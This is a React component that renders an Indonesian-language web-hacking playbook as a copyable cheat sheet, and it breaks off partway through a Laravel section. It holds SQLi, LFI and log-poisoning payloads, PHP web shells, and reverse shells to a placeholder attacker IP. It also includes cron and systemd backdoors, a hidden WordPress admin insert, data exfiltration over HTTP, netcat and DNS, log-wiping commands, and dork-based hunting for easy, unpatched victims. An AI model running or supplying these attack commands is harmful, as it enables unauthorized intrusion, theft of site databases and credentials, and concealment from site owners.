"use client";

import { useState } from "react";
import { ChevronDownIcon, ChevronRightIcon, ClipboardDocumentIcon, CheckIcon } from "@heroicons/react/24/outline";

// ---- types ----
interface CodeBlock { lang: string; code: string }
interface Section { id: string; title: string; text?: string; blocks?: CodeBlock[]; table?: { headers: string[]; rows: string[][] } }
interface Phase { id: string; label: string; badge: string; color: string; sections: Section[] }

// ---- copy button ----
function CopyBtn({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  };
  return (
    <button onClick={copy} className="flex items-center gap-1 rounded px-1.5 py-0.5 text-[10px] text-zinc-500 hover:text-zinc-300 hover:bg-zinc-700 transition-colors">
      {copied ? <CheckIcon className="h-3.5 w-3.5 text-green-400" /> : <ClipboardDocumentIcon className="h-3.5 w-3.5" />}
      {copied ? "Copied" : "Copy"}
    </button>
  );
}

// ---- collapsible section ----
function SectionBlock({ s }: { s: Section }) {
  const [open, setOpen] = useState(false);
  return (
    <div className="border border-zinc-800 rounded overflow-hidden">
      <button
        onClick={() => setOpen((v) => !v)}
        className="flex w-full items-center justify-between px-3 py-2.5 text-left bg-zinc-900 hover:bg-zinc-800 transition-colors"
      >
        <span className="text-xs font-medium text-zinc-300">{s.title}</span>
        {open ? <ChevronDownIcon className="h-3.5 w-3.5 text-zinc-600" /> : <ChevronRightIcon className="h-3.5 w-3.5 text-zinc-600" />}
      </button>
      {open && (
        <div className="px-4 py-3 space-y-3 bg-zinc-900/50">
          {s.text && <p className="text-xs text-zinc-400 whitespace-pre-line leading-relaxed">{s.text}</p>}
          {s.table && (
            <div className="overflow-x-auto rounded border border-zinc-800">
              <table className="w-full text-xs">
                <thead className="bg-zinc-900">
                  <tr>
                    {s.table.headers.map((h) => (
                      <th key={h} className="px-3 py-2 text-left text-[10px] font-semibold uppercase tracking-wider text-zinc-500">{h}</th>
                    ))}
                  </tr>
                </thead>
                <tbody>
                  {s.table.rows.map((row, i) => (
                    <tr key={i} className="border-t border-zinc-800">
                      {row.map((cell, j) => (
                        <td key={j} className="px-3 py-2 text-zinc-400 font-mono text-xs">{cell}</td>
                      ))}
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
          {s.blocks?.map((b, i) => (
            <div key={i} className="rounded border border-zinc-800 bg-zinc-950 overflow-hidden">
              <div className="flex items-center justify-between px-3 py-1.5 border-b border-zinc-800">
                <span className="text-[10px] text-zinc-600 font-mono">{b.lang}</span>
                <CopyBtn text={b.code} />
              </div>
              <pre className="p-4 overflow-x-auto text-xs text-green-300 font-mono leading-relaxed">{b.code}</pre>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

// ---- cheat sheet ----
const CHEATSHEET = [
  { goal: "Subdomain enum", cmd: `curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u` },
  { goal: "Fingerprint", cmd: "curl -sI target.com | grep -iE 'server|powered|cookie'" },
  { goal: "Directory listing", cmd: `curl -s target.com/uploads/ | grep 'Index of'` },
  { goal: "User enum (WP)", cmd: "curl -s target.com/wp-json/wp/v2/users" },
  { goal: "SQLi test", cmd: `curl "target.com/?id=1' AND SLEEP(5)-- -"` },
  { goal: "LFI test", cmd: `curl "target.com/?file=../../../etc/passwd"` },
  { goal: "Shell upload", cmd: `curl -F "file=@shell.php" target.com/upload` },
  { goal: "Reverse shell", cmd: `bash -i >& /dev/tcp/YOUR_IP/4444 0>&1` },
  { goal: "DB dump (MySQL)", cmd: `mysqldump -u user -p'pass' --all-databases > dump.sql` },
  { goal: "Data exfil", cmd: `curl -F "file=@/tmp/dump.tar.gz" http://YOUR_IP/upload` },
  { goal: "Privesc check", cmd: `sudo -l; find / -perm -4000 -type f 2>/dev/null` },
  { goal: "Pivot: vhosts", cmd: `cat /etc/nginx/sites-enabled/* | grep server_name` },
];

function CheatSheet() {
  const [copied, setCopied] = useState<number | null>(null);
  const copy = (i: number, text: string) => {
    navigator.clipboard.writeText(text);
    setCopied(i);
    setTimeout(() => setCopied(null), 1500);
  };
  return (
    <div className="space-y-2">
      <p className="text-[10px] text-zinc-600 mb-3">Quick reference commands — click row to copy.</p>
      {CHEATSHEET.map((item, i) => (
        <button
          key={i}
          onClick={() => copy(i, item.cmd)}
          className="w-full flex items-center gap-3 rounded border border-zinc-800 px-3 py-2 text-left hover:bg-zinc-800 transition-colors group mb-1"
        >
          <span className="min-w-[140px] text-[10px] font-medium text-fuchsia-400">{item.goal}</span>
          <code className="flex-1 font-mono text-xs text-zinc-400 truncate">{item.cmd}</code>
          {copied === i
            ? <CheckIcon className="h-3.5 w-3.5 text-green-400 shrink-0" />
            : <ClipboardDocumentIcon className="h-3.5 w-3.5 text-zinc-700 group-hover:text-zinc-400 shrink-0" />}
        </button>
      ))}
    </div>
  );
}

// ---- phase data ----
const PHASES: Phase[] = [
  {
    id: "p1", label: "Recon", badge: "Phase 1", color: "bg-blue-100 text-blue-700",
    sections: [
      {
        id: "1.1", title: "1.1 — Subdomain Enumeration",
        blocks: [
          { lang: "bash — passive (crt.sh)", code: `# Passive (tanpa menyentuh target)\ncurl -s "https://crt.sh/?q=%25.target.go.id&output=json" | jq -r '.[].name_value' | sort -u` },
          { lang: "bash — active (brute force)", code: `for sub in $(cat subdomains-top.txt); do\n  code=$(curl -sI "https://\${sub}.target.com" -o /dev/null -w "%{http_code}")\n  echo "[\${code}] \${sub}.target.com"\ndone | grep -v '\\[000\\]\\|\\[404\\]'` },
        ],
        table: {
          headers: ["Status Code", "Interpretasi"],
          rows: [
            ["200", "LIVE (bisa diakses)"],
            ["301/302", "Redirect (LIVE tapi pindah)"],
            ["403", "LIVE (terblokir, ada WAF/auth)"],
            ["401", "LIVE (butuh autentikasi)"],
            ["000", "MATI (timeout/DNS tidak ditemukan)"],
          ]
        }
      },
      {
        id: "1.2", title: "1.2 — Server & CMS Fingerprinting",
        blocks: [{ lang: "bash", code: `curl -sI "https://target.com" | grep -iE 'server|x-powered-by|set-cookie|x-frame-options|x-generator'\n\n# CMS detection\ncurl -s "https://target.com" | grep -iE 'wp-content|wp-includes'  # WordPress\ncurl -s "https://target.com" | grep -iE 'csrftoken|django'        # Django\ncurl -s "https://target.com" | grep -iE 'laravel|livewire'        # Laravel\ncurl -s "https://target.com" | grep -iE 'joomla|com_content'      # Joomla\ncurl -s "https://target.com" | grep -iE 'drupal|sites/default'    # Drupal` }],
        table: {
          headers: ["Header / Cookie", "CMS / Framework"],
          rows: [
            ["Set-Cookie: wordpress_*", "WordPress"],
            ["Set-Cookie: csrftoken=*", "Django"],
            ["Set-Cookie: PHPSESSID", "PHP Native / Laravel / Joomla"],
            ["Set-Cookie: laravel_session", "Laravel"],
            ["X-Powered-By: PHP/8.x.x", "PHP-based"],
            ["X-Powered-By: Express", "Node.js / Express"],
            ["X-Generator: Drupal X", "Drupal"],
            ["Server: LiteSpeed", "LiteSpeed (biasanya WP)"],
            ["Server: openresty", "OpenResty (nginx+Lua WAF)"],
            ["Server: Apache", "Apache (lebih mudah diexploit)"],
            ["Server: nginx", "nginx (konfigurasi lebih ketat)"],
            ["Server: Cloudflare", "Protected by Cloudflare"],
          ]
        }
      },
      {
        id: "1.3", title: "1.3 — Port Scanning",
        text: "Jika port database terbuka ke public, bisa langsung remote connect tanpa perlu RCE.",
        blocks: [{ lang: "bash", code: `# Web ports\nnmap -Pn -sV -p 80,443,8080,8443,3000,5000,8000 target.com\n\n# Database ports\nnmap -Pn -sV -p 3306,5432,27017,6379,1433 target.com` }]
      },
      {
        id: "1.4", title: "1.4 — WAF Detection",
        blocks: [{ lang: "bash", code: `# XSS payload\ncurl -s "https://target.com/?q=<script>alert(1)</script>" -o /dev/null -w "%{http_code}"\n\n# LFI payload\ncurl -s "https://target.com/?page=../../../etc/passwd" -o /dev/null -w "%{http_code}"\n\n# SQLi payload\ncurl -s "https://target.com/?id=1' OR '1'='1" -o /dev/null -w "%{http_code}"` }],
        table: {
          headers: ["Response Code", "Interpretasi"],
          rows: [
            ["200 (body beda)", "WAF block page (Cloudflare, Sucuri)"],
            ["403", "Blocked by WAF (ModSecurity, AWS WAF, Imunify360)"],
            ["406", "Not Acceptable (ModSecurity strict)"],
            ["415", "Unsupported Media Type (OpenResty)"],
            ["200 (sama)", "No WAF aktif — GREEN LIGHT 🚀"],
            ["503", "Rate limited / server overload"],
            ["999", "Custom WAF (seperti LinkedIn)"],
          ]
        }
      },
    ]
  },
  {
    id: "p2", label: "Enumeration", badge: "Phase 2", color: "bg-purple-100 text-purple-700",
    sections: [
      {
        id: "2.1", title: "2.1 — Directory & File Fuzzing",
        blocks: [
          { lang: "bash", code: `for path in admin login dashboard api uploads backup backups \\\n  db databases config .git .svn .env .htaccess .htpasswd \\\n  phpmyadmin phpinfo.php info.php test.php shell.php \\\n  vendor node_modules wp-admin administrator; do\n  code=$(curl -sI "https://target.com/$path" -o /dev/null -w "%{http_code}")\n  echo "[\${code}] $path"\ndone` },
          { lang: "bash — directory listing check", code: `curl -s "https://target.com/uploads/"\n# Jika response mengandung "Index of /" → DIRECTORY LISTING AKTIF 🚨` },
        ]
      },
      {
        id: "2.2", title: "2.2 — Version Disclosure",
        blocks: [{ lang: "bash", code: `# HTTP headers\ncurl -sI "https://target.com" | grep -i version\n\n# HTML comments\ncurl -s "https://target.com" | grep -E '<!--|<!--\\[if'\n\n# CSS/JS ver param\ncurl -s "https://target.com/" | grep -oP 'ver=[0-9.]+' | sort -u\n\n# Special endpoints\ncurl -s "https://target.com/version"\ncurl -s "https://target.com/api/version"\ncurl -s "https://target.com/robots.txt"` }]
      },
      {
        id: "2.3", title: "2.3 — User Enumeration",
        blocks: [{ lang: "bash", code: `# 1. Login response message difference\ncurl -s "https://target.com/login" --data "username=nonexistent123456&password=test"\n# "User not found" → invalid | "Incorrect password" → USER VALID 🚨\n\n# 2. API endpoints\nfor path in api/users api/v1/users /users /accounts /profiles; do\n  echo "[$(curl -sI "https://target.com$path" -o /dev/null -w '%{http_code}')] $path"\ndone\n\n# 3. Timing attack\ntime curl -s "https://target.com/login" --data "username=admin&password=wrong" -o /dev/null\ntime curl -s "https://target.com/login" --data "username=admi&password=wrong" -o /dev/null\n# Admin lebih lambat 100ms+ → user valid` }]
      },
      {
        id: "2.4", title: "2.4 — Parameter Discovery",
        blocks: [{ lang: "bash", code: `# LFI parameters\nfor param in page file path template include document view; do\n  echo "[$(curl -s "https://target.com/?\${param}=../../../etc/passwd" -o /dev/null -w '%{http_code}')] \${param}"\ndone\n\n# SQLi parameters\nfor param in id item product user cat category; do\n  echo "[$(curl -s "https://target.com/?\${param}=1'" -o /dev/null -w '%{http_code}')] \${param}"\ndone` }]
      },
    ]
  },
  {
    id: "p3", label: "Vuln Analysis", badge: "Phase 3", color: "bg-yellow-100 text-yellow-700",
    sections: [
      {
        id: "3.1", title: "3.1 — Klasifikasi Celah",
        text: `🚀 KRITIS (RCE langsung, tanpa auth):
  • Unauthenticated File Upload → RCE
  • SQL Injection (unauthenticated) → dump creds → login → RCE
  • LFI/RFI → read wp-config.php → DB creds → RCE
  • Deserialization (PHP/Java/Python) → RCE
  • Command Injection → RCE
  • SSTI (Server Side Template Injection) → RCE

🔄 TINGGI (Butuh auth atau info disclosure):
  • Authenticated File Upload → RCE
  • Stored XSS → curi cookie admin → session hijack
  • IDOR → akses data user lain
  • SSRF → scan internal network, akses cloud metadata
  • SQL Injection (authenticated) → escalation

📋 SEDANG:
  • Reflected XSS
  • Open Redirect
  • Missing security headers
  • Information Disclosure (path, version, debug mode)`,
      },
      {
        id: "3.2", title: "3.2 — CVE Matching Flow",
        text: `Setelah dapat versi CMS/Plugin/Server yang terdeteksi, cek di:
• https://www.cvedetails.com
• https://wpscan.com (khusus WordPress)
• https://patchstack.com/database
• https://www.exploit-db.com
• https://github.com → search CVE-YYYY-XXXX exploit
• https://nvd.nist.gov

Flow:
Ada PoC public? → Download/adaptasi exploit → test
Tidak ada PoC tapi versi vulnerable? → Analisis source code → buat exploit
Tidak ada CVE? → Cari misconfig, weak creds, directory listing`
      },
    ]
  },
  {
    id: "p4", label: "Exploitation", badge: "Phase 4", color: "bg-red-100 text-red-700",
    sections: [
      {
        id: "4.1", title: "4.1 — SQL Injection",
        blocks: [{ lang: "bash", code: `# Boolean-based test\ncurl "https://target.com/page?id=1' AND 1=1-- -"    # return normal\ncurl "https://target.com/page?id=1' AND 1=2-- -"    # return beda → SQLi 🚀\n\n# Time-based\ncurl "https://target.com/page?id=1' AND SLEEP(5)-- -"  # delay 5s → SQLi 🚀\n\n# UNION-based\ncurl "https://target.com/page?id=1' UNION SELECT 1,2,3,4-- -"\n\n# sqlmap\nsqlmap -u "https://target.com/page?id=1" --batch --level=3 --risk=2\n\n# Dump users table\nsqlmap -u "https://target.com/page?id=1" -D target_db -T users --dump` }]
      },
      {
        id: "4.2", title: "4.2 — LFI/RFI to RCE",
        blocks: [{ lang: "bash", code: `# Step 1: Confirm LFI\ncurl "https://target.com/?page=../../../etc/passwd"\n# /etc/passwd terbaca → LFI CONFIRMED 🚀\n\n# Step 2: Log Poisoning — inject PHP ke Apache log\ncurl -s "https://target.com/" \\\n  -H "User-Agent: <?php system(\\$_GET['c']); ?>"\n\n# Step 3: Include log + RCE\ncurl "https://target.com/?page=../../../../var/log/apache2/access.log&c=id"\n\n# PHP Wrappers\n# Base64 encode: php://filter/convert.base64-encode/resource=config.php\n# Data wrapper: ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id` }]
      },
      {
        id: "4.3", title: "4.3 — File Upload — Web Shell",
        blocks: [{ lang: "bash", code: `# Basic PHP shell\necho '<?php system($_GET["c"]); ?>' > shell.php\n\n# Upload\ncurl -s "https://target.com/upload.php" -F "file=@shell.php"\n\n# Extension bypass tricks\necho '<?php system($_GET["c"]); ?>' > shell.phtml\necho '<?php system($_GET["c"]); ?>' > shell.php5\necho '<?php system($_GET["c"]); ?>' > shell.php.jpg\necho 'GIF89a<?php system($_GET["c"]); ?>' > shell.php  # GIF polyglot\n\n# Verify shell\ncurl "https://target.com/uploads/shell.php?c=id"` }]
      },
      {
        id: "4.4", title: "4.4 — Password Attacks",
        blocks: [{ lang: "bash", code: `# Password spraying (1 password, banyak user)\nfor user in $(cat users.txt); do\n  curl -s "https://target.com/login" \\\n    --data "username=\${user}&password=Spring2025!"\ndone\n\n# Brute force (banyak password, 1 user)\nwhile read pass; do\n  curl -s "https://target.com/login" --data "username=admin&password=\${pass}"\ndone < rockyou.txt\n\n# Bypass rate limiting:\n# Rotate X-Forwarded-For: -H "X-Forwarded-For: 10.0.\${RANDOM}.\${RANDOM}"\n# Slow attack: sleep 5-10 detik antar request\n# Coba endpoint lain: admin-ajax.php, xmlrpc.php` }]
      },
      {
        id: "4.5", title: "4.5 — Reverse Shell",
        blocks: [{ lang: "bash", code: `# PHP\nmsfvenom -p php/reverse_php LHOST=YOUR_IP LPORT=4444 -f raw > rev.php\n\n# Python\ncurl "https://target.com?c=python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"YOUR_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"bash\")'\"\n\n# Bash\ncurl "https://target.com?c=bash -i >%26 /dev/tcp/YOUR_IP/4444 0>%261"\n\n# Netcat\ncurl "https://target.com?c=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc YOUR_IP 4444 >/tmp/f"\n\n# Listener\nnc -lvnp 4444` }]
      },
    ]
  },
  {
    id: "p5", label: "Post-Exploit", badge: "Phase 5", color: "bg-orange-100 text-orange-700",
    sections: [
      {
        id: "5.1", title: "5.1 — Internal Enumeration",
        blocks: [{ lang: "bash", code: `whoami && id\nuname -a\ncat /etc/os-release\nhostname\nip a && ip route\nss -tlnp          # listening ports\nps aux            # running processes\ncat /etc/crontab  # scheduled tasks\nsudo -l           # sudo privileges` }]
      },
      {
        id: "5.2", title: "5.2 — Cari DB Credentials",
        blocks: [{ lang: "bash", code: `# WordPress\ncat wp-config.php | grep -E 'DB_NAME|DB_USER|DB_PASSWORD|DB_HOST'\n\n# Laravel\ncat .env | grep -E 'DB_|PASSWORD|KEY'\n\n# Django\ncat settings.py | grep -E 'DATABASES|SECRET_KEY|PASSWORD'\n\n# Generic search\ngrep -r "password\\|passwd\\|DB_PASSWORD" /var/www/ 2>/dev/null\nfind /var/www -name ".env" -o -name "database.php" 2>/dev/null` }]
      },
      {
        id: "5.3", title: "5.3 — Dump Database",
        blocks: [{ lang: "bash", code: `# MySQL/MariaDB\nmysql -h DB_HOST -u DB_USER -p'DB_PASSWORD' -e "SHOW DATABASES;"\nmysqldump -h DB_HOST -u DB_USER -p'DB_PASSWORD' --all-databases > /tmp/dump.sql\n\n# PostgreSQL\nPGPASSWORD='PASS' pg_dump -h DB_HOST -U DB_USER -d DB_NAME > /tmp/dump.sql\n\n# MongoDB\nmongodump --host DB_HOST --username DB_USER --password 'PASS' --out /tmp/mongo_dump` }]
      },
      {
        id: "5.4", title: "5.4 — Cari Kredensial Hosting & SSH",
        blocks: [{ lang: "bash", code: `# SSH keys\nfind /home -name "id_rsa" -o -name "authorized_keys" 2>/dev/null\nfind /root -name "id_rsa" -o -name ".ssh" -type d 2>/dev/null\n\n# FTP credentials\ngrep -r "ftp_host\\|ftp_user\\|ftp_pass" /var/www/ 2>/dev/null\n\n# Cloud metadata\ncurl -s http://169.254.169.254/latest/meta-data/    # AWS\ncurl -s http://169.254.169.254/computeMetadata/v1/   # GCP` }]
      },
      {
        id: "5.5", title: "5.5 — Pivoting ke Server Lain",
        blocks: [{ lang: "bash", code: `# Temukan semua vhost di server\ncat /etc/apache2/sites-enabled/*.conf | grep -E 'ServerName|ServerAlias'\ncat /etc/nginx/sites-enabled/* | grep server_name\n\n# Baca wp-config semua website di server\nfor site_dir in /var/www/*/; do\n  if [ -f "\${site_dir}wp-config.php" ]; then\n    echo "=== \${site_dir} ==="\n    grep -E 'DB_NAME|DB_USER|DB_PASSWORD' "\${site_dir}wp-config.php"\n  fi\ndone\n\n# Scan internal network\nfor ip in $(seq 1 254); do\n  timeout 1 bash -c "echo '' > /dev/tcp/192.168.1.\${ip}/22" 2>/dev/null && echo "SSH: 192.168.1.\${ip}"\ndone` }]
      },
      {
        id: "5.6", title: "5.6 — Privilege Escalation",
        blocks: [{ lang: "bash", code: `# Kernel version\nuname -r  # cari CVE di exploit-db\n\n# SUID binaries\nfind / -perm -4000 -type f 2>/dev/null | xargs ls -la\n\n# Sudo misconfig\nsudo -l\n# Contoh: (ALL) NOPASSWD: /usr/bin/vim → sudo vim -c '!bash'\n\n# Cron jobs\ncat /etc/crontab && ls -la /etc/cron*\n\n# Docker breakout\ndocker run -v /:/mnt -it alpine chroot /mnt sh\n\n# LXD/LXC\nlxc list 2>/dev/null` }]
      },
    ]
  },
  {
    id: "p6", label: "DB Access", badge: "Phase 6", color: "bg-green-100 text-green-700",
    sections: [
      {
        id: "6.1", title: "6.1 — Eksplorasi Database",
        blocks: [{ lang: "sql", code: `-- Semua tabel + row count\nSELECT table_name, table_rows \nFROM information_schema.tables \nWHERE table_schema NOT IN ('mysql','information_schema','performance_schema');\n\n-- Cari tabel user/credentials\nSELECT table_name FROM information_schema.tables \nWHERE table_name LIKE '%user%' OR table_name LIKE '%admin%' OR table_name LIKE '%login%';` }]
      },
      {
        id: "6.2", title: "6.2 — Ekstrak Data per CMS",
        blocks: [
          { lang: "sql — WordPress", code: `SELECT user_login, user_email, user_pass FROM wp_users;\n\nSELECT option_name, option_value FROM wp_options \nWHERE option_name LIKE '%api%key%' OR option_name LIKE '%secret%';` },
          { lang: "sql — Laravel", code: `SELECT id, name, email, password FROM users;\nSELECT email, token FROM password_resets;` },
          { lang: "sql — Django", code: `SELECT id, username, email, password, is_staff, is_superuser FROM auth_user;\nSELECT session_key, session_data, expire_date FROM django_session;` },
          { lang: "sql — Joomla", code: `SELECT id, name, username, email, password FROM jos_users;` },
          { lang: "sql — Drupal", code: `SELECT uid, name, mail, pass FROM users;` },
        ]
      },
      {
        id: "6.3", title: "6.3 — Export & Exfiltrate",
        blocks: [{ lang: "bash", code: `# Export CSV\nmysql -u user -p'pass' dbname -e "SELECT * FROM wp_users INTO OUTFILE '/tmp/users.csv' FIELDS TERMINATED BY ',' ENCLOSED BY '\"' LINES TERMINATED BY '\\\\n';"\n\n# Compress\ntar czf /tmp/data_dump.tar.gz /tmp/dump.sql /var/www/html/wp-config.php /var/www/html/.env\n\n# Exfil via HTTP\ncurl -F "file=@/tmp/data_dump.tar.gz" http://YOUR_IP:8080/upload\n\n# Exfil via Netcat\nnc YOUR_IP 8888 < /tmp/data_dump.tar.gz\n\n# DNS exfil (firewall bypass)\nfor line in $(cat /tmp/dump.sql | xxd -p -c 32); do\n  dig @8.8.8.8 "\${line}.attacker-server.com" +short\ndone` }]
      },
    ]
  },
  {
    id: "p7", label: "Persistence", badge: "Phase 7", color: "bg-pink-100 text-pink-700",
    sections: [
      {
        id: "7.1", title: "7.1 — Web-Level Backdoor",
        blocks: [{ lang: "bash", code: `# PHP — inject ke footer.php (jarang diupdate)\necho '<?php @eval($_POST["x"]);' >> /var/www/html/wp-content/themes/medika/footer.php\n\n# ASPX\necho '<%@ Page Language="C#" %> <% System.Diagnostics.Process.Start(Request["cmd"]); %>' > shell.aspx\n\n# JSP\necho '<% Runtime.getRuntime().exec(request.getParameter("c")); %>' > shell.jsp` }]
      },
      {
        id: "7.2", title: "7.2 — OS-Level Persistence",
        blocks: [{ lang: "bash", code: `# Cron job reverse shell (setiap 30 menit)\n(crontab -l 2>/dev/null; echo "*/30 * * * * /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/5555 0>&1'") | crontab -\n\n# SSH authorized_keys\nmkdir -p ~/.ssh && chmod 700 ~/.ssh\necho "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys\nchmod 600 ~/.ssh/authorized_keys\n\n# systemd service\ncat > /etc/systemd/system/backdoor.service << 'EOF'\n[Unit]\nDescription=Backdoor Service\n[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/6666 0>&1'\nRestart=always\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl enable backdoor.service && systemctl start backdoor.service` }]
      },
      {
        id: "7.3", title: "7.3 — Database Backdoor (WP)",
        blocks: [{ lang: "sql", code: `-- Buat hidden admin user\nINSERT INTO wp_users (user_login, user_pass, user_email, user_registered)\nVALUES ('hidden_admin', MD5('ComplexP@ss123'), 'hidden@mail.com', NOW());\n\n-- Set role administrator\nINSERT INTO wp_usermeta (user_id, meta_key, meta_value)\nVALUES (LAST_INSERT_ID(), 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}');\nINSERT INTO wp_usermeta (user_id, meta_key, meta_value)\nVALUES (LAST_INSERT_ID(), 'wp_user_level', '10');` }]
      },
    ]
  },
  {
    id: "p8", label: "Cleanup", badge: "Phase 8", color: "bg-gray-100 text-gray-700",
    sections: [
      {
        id: "8.1", title: "8.1 — Hapus Jejak",
        blocks: [{ lang: "bash", code: `# Hapus shell\nfind /var/www -name "shell.*" -o -name "rev.*" -o -name "cmd.*" -exec rm {} \\; 2>/dev/null\n\n# Clear history\nhistory -c\ncat /dev/null > ~/.bash_history\ncat /dev/null > ~/.mysql_history\n\n# Hapus baris log yang mengandung IP kita\nsed -i "/YOUR_IP/d" /var/log/apache2/access.log\nsed -i "/shell.php/d" /var/log/apache2/access.log\nsed -i "/YOUR_IP/d" /var/log/auth.log\n\n# Hapus temp files\nrm -rf /tmp/*.sql /tmp/*.tar.gz /tmp/chunk_*` }]
      },
      {
        id: "8.2", title: "8.2 — Report Template",
        text: `# PENETRATION TEST REPORT
## Target: example.com

### 1. Executive Summary
- Total subdomain ditemukan: X
- Total vulnerability: X (Kritis: X, Tinggi: X, Sedang: X)
- Akses database: ✅ / ❌
- Akses server (root): ✅ / ❌
- Data bocor: X records

### 2. Critical Findings
1. [CVE-YYYY-XXXX] SQL Injection — /page?id=1
   - Dampak: Full database dump
2. Directory Listing — /uploads/
   - Dampak: File sensitif bocor
3. File Upload tanpa filter — /upload.php
   - Dampak: RCE via web shell

### 3. Remediation
| Issue | Priority | Fix |
|-------|----------|-----|
| SQLi | Critical | Prepared statements |
| Directory listing | High | Options -Indexes |
| File upload | Critical | Whitelist extension + MIME validation |`
      },
    ]
  },
];

// ---- general methodology phases ----
const GENERAL_PHASES: Phase[] = [
  {
    id: "g0", label: "Target Selection", badge: "Phase 0", color: "bg-zinc-800 text-zinc-300",
    sections: [
      {
        id: "g0.0", title: "0.0 — Kriteria Target Mudah",
        text: `TARGET MUDAH (high probability):
  ❌ Pakai Cloudflare / WAF ketat
  ✅ Tanpa WAF atau WAF longgar (Apache)

  ❌ Framework terbaru (Laravel 11, Django 5, WP 6.9)
  ✅ Framework usang (WP < 5.x, Joomla 2.x, PHP 5.x)

  ❌ Semua subdomain di-infra sama
  ✅ Subdomain tidak terkelola (masing-masing punya infra sendiri)

  ❌ Halaman statis (HTML murni)
  ✅ Ada parameter GET/POST (page, id, file, search, dll)

  ❌ Developer aktif (update rutin)
  ✅ Developer tidak aktif (maintenance terakhir 2+ tahun lalu)`,
      },
      {
        id: "g0.1", title: "0.1 — Google Dorking (Mass Target Discovery)",
        blocks: [
          { lang: "bash — dork templates", code: `# WordPress dengan directory listing
inurl:/wp-content/uploads/ intitle:"index of"

# phpinfo terbuka
inurl:phpinfo.php intitle:"phpinfo"

# SQL backup terbuka
ext:sql "INSERT INTO" "password" -github.com -stackoverflow

# .env terbuka
intitle:"index of" .env

# Parameter GET mencurigakan
inurl:"?page=" inurl:"php" -inurl:"phpmyadmin"
inurl:"?file=" inurl:"php"
inurl:"?id=" inurl:"php"

# Admin panel terbuka
intitle:"admin" inurl:/admin/ "username" "password"` },
        ]
      },
      {
        id: "g0.2", title: "0.2 — Certificate Transparency",
        blocks: [
          { lang: "bash", code: `# crt.sh — semua subdomain domain apapun
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\\*\\.//' | sort -u` },
        ]
      },
      {
        id: "g0.3", title: "0.3 — Shodan / Censys (Passive)",
        text: `Di Shodan search bar:

"Apache" "PHP" "wp-login" country:ID
"nginx" port:8080
port:3306 "MySQL"
port:5432 "PostgreSQL"
port:27017 "MongoDB"

Cari server dengan exposed database atau panel admin terbuka.`,
      },
    ]
  },
  {
    id: "g1", label: "Recon", badge: "Phase 1", color: "bg-zinc-800 text-zinc-300",
    sections: [
      {
        id: "g1.1", title: "1.1 — Health Check Cepat",
        blocks: [
          { lang: "bash", code: `# 1. Apakah target hidup?
curl -sI "https://target.com" -o /dev/null -w "Status: %{http_code}\\nServer: %{server}\\n"

# 2. Ada WAF?
curl -s "https://target.com/?q=<script>alert(1)</script>" -o /dev/null -w "Payload test: %{http_code}\\n"

# 3. Parameter GET menarik?
curl -s "https://target.com/" | grep -oP 'href="[^"]*\\?[^"]*"' | head -5
curl -s "https://target.com/" | grep -oP 'action="[^"]*\\?[^"]*"' | head -5` },
        ]
      },
      {
        id: "g1.2", title: "1.2 — Quick Win Check (30 Detik)",
        blocks: [
          { lang: "bash — first 5 checks per target", code: `# 1. Admin page
curl -sI "https://target.com/admin" -o /dev/null -w "[1] admin: %{http_code}\\n"
curl -sI "https://target.com/login" -o /dev/null -w "[1] login: %{http_code}\\n"

# 2. Directory listing
curl -s "https://target.com/uploads/" | head -5 | grep -q "Index of" && echo "[2] DIRECTORY LISTING 🚀"
curl -s "https://target.com/backups/" | head -5 | grep -q "Index of" && echo "[2] BACKUPS TERBUKA 🚀"

# 3. LFI test
curl -sI "https://target.com/?page=../../../etc/passwd" -o /dev/null -w "[3] LFI test: %{http_code}\\n"
curl -s "https://target.com/?page=../../../etc/passwd" | grep -q "root:" && echo "[3] LFI CONFIRMED 🚀"

# 4. SQLi time-based
time curl -s "https://target.com/?id=1" -o /dev/null -w "[4] Normal: %{time_total}s\\n"
time curl -s "https://target.com/?id=1' AND SLEEP(3)-- -" -o /dev/null -w "[4] SQLi test: %{time_total}s\\n"

# 5. Info disclosure
curl -s "https://target.com/phpinfo.php" | grep -q "PHP Version" && echo "[5] phpinfo 🚀"
curl -s "https://target.com/.env" | grep -q "DB_" && echo "[5] .env bocor 🚀"` },
        ]
      },
      {
        id: "g1.3", title: "1.3 — Detection Grid per Target",
        text: `Buat assessment grid setiap target:

TARGET: example.com

[✅/❌] Admin panel terbuka tanpa auth
[✅/❌] Directory listing aktif
[✅/❌] User enumeration mungkin
[✅/❌] LFI/RFI parameter ditemukan
[✅/❌] Parameter GET numerik (SQLi candidate)
[✅/❌] File upload endpoint ditemukan
[✅/❌] CMS/framework terdeteksi & versi diketahui
[✅/❌] WAF tidak terdeteksi

TOTAL: X/8 ✅ → PRIORITAS TINGGI`,
      },
    ]
  },
  {
    id: "g2", label: "CMS Enum", badge: "Phase 2", color: "bg-zinc-800 text-zinc-300",
    sections: [
      {
        id: "g2.1", title: "2.1 — WordPress",
        blocks: [
          { lang: "bash", code: `# Deteksi
curl -s "https://target.com/" | grep -qi 'wp-content' && echo "WORDPRESS"

# Versi
curl -s "https://target.com/" | grep -oP 'ver=[0-9.]+' | sort -u

# User list (ENDPOINT KRITIS)
curl -s "https://target.com/wp-json/wp/v2/users" | jq -r '.[] | "\\(.id) \\(.name) \\(.slug)"'

# Plugin list
curl -s "https://target.com/" | grep -oP 'wp-content/plugins/[^/"]+' | sort -u` },
        ]
      },
      {
        id: "g2.2", title: "2.2 — Laravel",
        blocks: [
